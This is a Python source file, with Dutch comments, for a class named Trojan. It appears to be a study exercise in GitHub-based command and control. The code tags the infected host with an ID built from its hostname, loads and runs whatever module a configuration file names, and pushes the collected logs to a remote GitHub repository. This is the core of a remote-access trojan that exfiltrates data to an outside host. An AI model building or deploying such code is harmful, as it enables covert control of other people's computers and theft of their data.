from github import Github
import socket
import datetime
import random
import os
import json
from importlib import import_module



class Trojan():
    def __init__(self,repo_url):
        self.repo_url = repo_url
        self.github_connectie = Github(self.repo_url)
        self.id = ''

    def run(self):
        self.generate_unique_id()
        self.create_directory_in_logs()
        print(self.github_connectie.check_remote_repo())
        self.run_modules()
        print(self.github_connectie.send_logs_to_github(self.id))

    def run_modules(self):
        config_path = "config/config.txt"  # Het pad naar het configuratiebestand
        with open(config_path, "r") as config_file:
            config = json.load(config_file)
            module_name = config[0]["module_name"]
            class_name = config[0]["class_name"]
            module_path = f"modules.{module_name}"
            module = import_module(module_path)
            my_class = getattr(module, class_name)()
            my_class.log(self.id)


    def generate_unique_id(self):
        """Deze functie zal unique id maken op basis van de hostname + datum + een random nummer"""
        hostname = socket.gethostname()
        current_day = datetime.date.today().strftime('%Y%m%d')
        number = int(random.uniform(1, 2000))
        unique_id = f"{hostname}_{current_day}_{number}"
        self.id = unique_id
    
    def create_directory_in_logs(self):
        """Deze functie zal een map aanmaken in de map logs op basis van de hostname + datum """
        logs_directory = "logs"
        new_directory_path = os.path.join(logs_directory, self.id)
        if not os.path.exists(logs_directory):
            print(f"De map '{logs_directory}' bestaat niet.")
            return
        if os.path.exists(new_directory_path):
            return
        os.makedirs(new_directory_path)
        print(f"De map '{new_directory_path}' is succesvol aangemaakt.")



def main():
    trojan = Trojan('git@github.com:laurensDSM/test0.git')
    trojan.run()



if __name__ == "__main__":
    main()